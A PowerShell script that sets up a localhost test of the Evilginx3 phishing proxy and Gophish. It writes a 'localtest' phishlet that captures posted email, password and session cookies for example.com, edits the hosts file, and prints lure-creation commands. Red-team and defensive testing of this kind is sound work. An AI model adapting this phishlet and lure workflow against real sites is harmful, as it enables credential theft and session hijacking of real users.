# Evilginx Local Testing Script
# This script sets up a quick local test environment

$ErrorActionPreference = "Stop"

$TestDir = "C:\evilginx-test"
$ExePath = "C:\Users\user\Downloads\Evil\ginx3\Evilginx3\evilginx.exe"

Write-Host "=== Evilginx Local Test Setup ===" -ForegroundColor Cyan

# Check for existing processes and kill them
$existingProcesses = Get-Process | Where-Object { $_.ProcessName -like "*evilginx*" }
if ($existingProcesses) {
    Write-Host "Stopping existing evilginx processes..." -ForegroundColor Yellow
    $existingProcesses | Stop-Process -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 2
}

# Clean up old databases if they exist (fixes "no such table" errors)
foreach ($db in @("data.db", "gophish.db")) {
    $DbPath = Join-Path $TestDir $db
    if (Test-Path $DbPath) {
        Write-Host "Removing old database $db (fixes initialization issues)..." -ForegroundColor Yellow
        Remove-Item $DbPath -Force -ErrorAction SilentlyContinue
    }
}

# Check if binary exists
if (-not (Test-Path $ExePath)) {
    Write-Host "Building evilginx..." -ForegroundColor Yellow
    Set-Location C:\Users\user\Downloads\Evil\ginx3\Evilginx3
    go build -o evilginx.exe .
    if (-not $?) { exit 1 }
}

# Create test directories
Write-Host "Creating test directories..." -ForegroundColor Green
New-Item -ItemType Directory -Force -Path $TestDir | Out-Null
New-Item -ItemType Directory -Force -Path "$TestDir\phishlets" | Out-Null
New-Item -ItemType Directory -Force -Path "$TestDir\redirectors" | Out-Null
New-Item -ItemType Directory -Force -Path "$TestDir\post_redirectors" | Out-Null
New-Item -ItemType Directory -Force -Path "$TestDir\landing_pages" | Out-Null

# Copy phishlets
Write-Host "Copying phishlets..." -ForegroundColor Green
Copy-Item -Recurse -Force "C:\Users\user\Downloads\Evil\ginx3\Evilginx3\phishlets\*" "$TestDir\phishlets\" -ErrorAction SilentlyContinue

# Copy landing pages
Write-Host "Copying landing pages..." -ForegroundColor Green
Copy-Item -Recurse -Force "C:\Users\user\Downloads\Evil\ginx3\Evilginx3\landing_pages\*" "$TestDir\landing_pages\" -ErrorAction SilentlyContinue

# Create a simple test phishlet for local testing
$TestPhishlet = @"
name: 'localtest'
author: 'test'
min_ver: '3.0.0'
proxy_hosts:
  - {phish_sub: 'www', orig_sub: 'www', domain: 'example.com', session: true, is_landing: true }
sub_filters:
  - {hostname: 'www.example.com', sub: 'www.localtest.com', domain: 'example.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: 'text/html,application/json,application/javascript'}
auth_tokens:
  - {domain: 'example.com', name: 'session', path: '/'}
credentials:
  username:
    key: 'email'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'
login:
  domain: 'www.example.com'
  path: /login
"

$TestPhishlet | Out-File -FilePath "$TestDir\phishlets\localtest.yaml" -Encoding UTF8
Write-Host "Created test phishlet: localtest" -ForegroundColor Green

# Check hosts file
$HostsFile = "C:\Windows\System32\drivers\etc\hosts"
$HostEntries = @(
    "127.0.0.1    www.localtest.com",
    "127.0.0.1    localtest.com"
)

Write-Host "`n=== Hosts File Configuration ===" -ForegroundColor Cyan
Write-Host "Add these entries to $HostsFile (requires admin):" -ForegroundColor Yellow
foreach ($entry in $HostEntries) {
    Write-Host "  $entry" -ForegroundColor White
}

# Check if entries exist
$CurrentHosts = Get-Content $HostsFile -ErrorAction SilentlyContinue
$NeedsUpdate = $false
foreach ($entry in $HostEntries) {
    if ($CurrentHosts -notcontains $entry) {
        $NeedsUpdate = $true
    }
}

if ($NeedsUpdate) {
    Write-Host "`nHosts file needs updating. Attempting to update (may need admin)..." -ForegroundColor Yellow
    try {
        Add-Content -Path $HostsFile -Value "`n# Evilginx local test entries" -ErrorAction Stop
        foreach ($entry in $HostEntries) {
            Add-Content -Path $HostsFile -Value $entry -ErrorAction Stop
        }
        Write-Host "Hosts file updated successfully!" -ForegroundColor Green
    } catch {
        Write-Host "Could not update hosts file automatically. Please run as admin or edit manually." -ForegroundColor Red
    }
}

# Run evilginx
Write-Host "`n=== Starting Evilginx ===" -ForegroundColor Cyan
Write-Host "Configuration directory: $TestDir" -ForegroundColor Gray
Write-Host "`nCommands to run after startup:" -ForegroundColor Yellow
Write-Host "  domains set localtest.com" -ForegroundColor White
Write-Host "  config ipv4 external 127.0.0.1" -ForegroundColor White
Write-Host "  phishlets hostname localtest login.localtest.com" -ForegroundColor White
Write-Host "  phishlets enable localtest" -ForegroundColor White
Write-Host "  lures create localtest" -ForegroundColor White
Write-Host "  lures get-url 0" -ForegroundColor White
Write-Host "`nAdmin panels:" -ForegroundColor Yellow
Write-Host "  Web Admin:  http://127.0.0.1:2030/  (credentials printed at startup)" -ForegroundColor White
Write-Host "  Gophish UI: http://127.0.0.1:3333/  (admin + password printed at startup)" -ForegroundColor White
Write-Host "`nPress Ctrl+C to stop..." -ForegroundColor Gray
Write-Host ""

# Start evilginx
& $ExePath -developer -c $TestDir -p "$TestDir\phishlets" -t "$TestDir\redirectors" -u "$TestDir\post_redirectors" -l "$TestDir\landing_pages" -debug
